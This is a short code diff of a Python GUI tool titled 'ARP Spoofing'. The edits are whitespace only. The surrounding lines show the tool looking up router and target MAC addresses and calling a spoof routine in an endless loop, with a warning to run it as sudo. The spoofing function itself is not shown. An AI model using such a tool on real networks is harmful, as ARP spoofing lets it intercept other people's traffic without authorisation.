@@ -3,14 +3,14 @@ import scapy.all as scapy
 import time
 import os
 
-
 def submit():
+
     router_ip_entry = router_ip.get()
     target_ip_entry = target_ip.get()
     
     target_mac = str(get_mac_address(target_ip_entry))
     router_mac = str(get_mac_address(router_ip_entry))
-
+    
     try:
         while True:
             spoof(router_ip_entry, target_ip_entry, router_mac, target_mac)
@@ -36,6 +36,7 @@ window = Tk()
 window.title("ARP Spoofing")
 #window.geometry("500x500")
 window.config(background="#000000")
+
 if not 'SUDO_UID' in os.environ.keys():
     sudo_warning = Label(window, text="WARNING: RUN WITH SUDO!!!", font=("Arial Bold", 12), bg="#000000", fg="#00ff00")
     sudo_warning.pack(side=TOP)
